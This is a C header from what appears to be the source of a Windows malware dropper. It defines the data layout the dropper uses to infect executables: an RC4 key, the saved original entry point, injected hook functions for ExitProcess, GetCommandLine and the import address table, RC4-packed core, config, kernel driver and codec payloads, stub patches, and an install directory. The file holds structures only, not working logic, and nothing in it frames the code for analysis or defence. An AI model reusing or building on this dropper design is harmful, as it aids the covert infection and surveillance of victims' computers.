#ifndef DropperHeader_h__
#define DropperHeader_h__

#include "common.h"
#include "rc4.h"


#ifdef WIN32
#define ALIGN4 __declspec(align(4))
#else
#define ALIGN4 __attribute__((aligned(4)))
#endif

typedef void (*WINSTARTFUNC)(void);

typedef ALIGN4 struct _data_section_blob {
	DWORD offset;
	DWORD size;
} DataSectionBlob;

typedef ALIGN4 struct _patch_blob {
	DWORD VA;
	DWORD offset;
	DWORD size;
} PatchBlob;

typedef ALIGN4 struct _data_section_cryptopack {
	DWORD offset;
	DWORD size;
	DWORD original_size;
	DWORD characteristics;
} DataSectionCryptoPack;

typedef ALIGN4 struct _data_section_files {
	struct {
		DataSectionBlob core;
		DataSectionBlob core64;
		DataSectionBlob config;
		DataSectionBlob driver;
		DataSectionBlob driver64;
		DataSectionBlob codec;
	} names;
	
	DataSectionCryptoPack core;
	DataSectionCryptoPack core64;
	DataSectionCryptoPack config;
	DataSectionCryptoPack driver;
	DataSectionCryptoPack driver64;
	DataSectionCryptoPack codec;
} DataSectionFiles;



typedef  __declspec(align(4)) struct _data_section_header 
{
	// RC4
	// Encryption key
	CHAR rc4key[RC4KEYLEN];

	// OEP
	WINSTARTFUNC   pfn_OriginalEntryPoint;

	// Synchronization
	DWORD synchro;

	// used to pass full qualified path to core thread
	CHAR *dllPath;

	// our own functions
	struct {
		DataSectionBlob newEntryPoint;
		DataSectionBlob coreThread;
		DataSectionBlob dumpFile;
		DataSectionBlob exitProcessHook;
		DataSectionBlob exitHook;
		DataSectionBlob GetCommandLineAHook;
		DataSectionBlob GetCommandLineWHook;
		DataSectionBlob rvaToOffset;
		DataSectionBlob rc4;
		DataSectionBlob hookIAT;
		DataSectionBlob load;
	} functions;

	DataSectionFiles files;

	PatchBlob stage1;
	PatchBlob stage2;

	DataSectionBlob restore;

	ULONG exeType;
	BOOL isScout;

	CHAR instDir[10];
	CHAR eliteExports[18];
	CHAR version[20];
} DropperHeader;

/*
typedef ALIGN4 struct _data_section_header {
	// RC4 encryption key
	CHAR rc4key[RC4KEYLEN];
	
	// OEP
	WINSTARTFUNC   pfn_OriginalEntryPoint;
	
	// Synchronization
	DWORD synchro;
	
	// used to pass full qualified path to core thread
	CHAR *dllPath;
	
	// used to hook ExitProcess on Vista (Vista deletes call names from Thunks when EXE is loaded)
	struct {
		int ExitProcess;
		int exit;
		int _exit;
	} hookedCalls;
	
	// our own functions
	struct {
		DataSectionBlob entryPoint;
		DataSectionBlob coreThread;
		DataSectionBlob dumpFile;
		DataSectionBlob exitProcessHook;
		DataSectionBlob exitHook;
		DataSectionBlob GetCommandLineAHook;
		DataSectionBlob GetCommandLineWHook;
		DataSectionBlob rvaToOffset;
		DataSectionBlob rc4;
		DataSectionBlob hookCall;
		DataSectionBlob load;
	} functions;					// COOKED

	// appended files
	DataSectionFiles files;			// COOKED

	// stub code patches to restore original code
	PatchBlob stage1;
	PatchBlob stage2;

	// saves state, jump to dropper and return to OEP
	DataSectionBlob restore;

	ULONG exeType;
	BOOL isScout;

	CHAR instDir[10];
	CHAR eliteExports[18];
	CHAR version[20];
} DropperHeader;
*/
#endif // DropperHeader_h__
